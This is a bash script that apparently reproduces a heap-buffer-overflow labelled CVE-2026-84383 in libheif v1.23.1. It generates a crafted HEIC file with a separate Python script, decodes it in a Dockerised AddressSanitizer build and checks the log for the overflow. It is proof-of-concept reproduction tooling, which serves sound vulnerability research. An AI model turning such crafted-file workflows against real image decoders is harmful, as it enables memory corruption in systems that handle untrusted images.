#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ARTIFACTS="${ROOT}/lab/artifacts"
mkdir -p "${ARTIFACTS}"

python3 "${ROOT}/lab/generate_heic_poc.py"
mv poc.heic "${ARTIFACTS}/CVE-2026-84383.heic"

echo "[*] Building vulnerable libheif v1.23.1 with AddressSanitizer"
docker compose --project-directory "${ROOT}/lab" build libheif-vulnerable

echo "[*] Triggering crafted HEIC decode"
set +e
docker compose --project-directory "${ROOT}/lab" run --rm \
  -v "${ARTIFACTS}:/artifacts" \
  libheif-vulnerable /artifacts/CVE-2026-84383.heic /artifacts/vulnerable-output.png \
  >"${ARTIFACTS}/CVE-2026-84383-vulnerable.log" 2>&1
status=$?
set -e

cat "${ARTIFACTS}/CVE-2026-84383-vulnerable.log"
if rg -q "AddressSanitizer: heap-buffer-overflow" "${ARTIFACTS}/CVE-2026-84383-vulnerable.log"; then
  echo "[+] Reproduced heap-buffer-overflow (decoder exit=${status})"
else
  echo "[-] Expected AddressSanitizer heap-buffer-overflow was not observed (decoder exit=${status})" >&2
  exit 1
fi
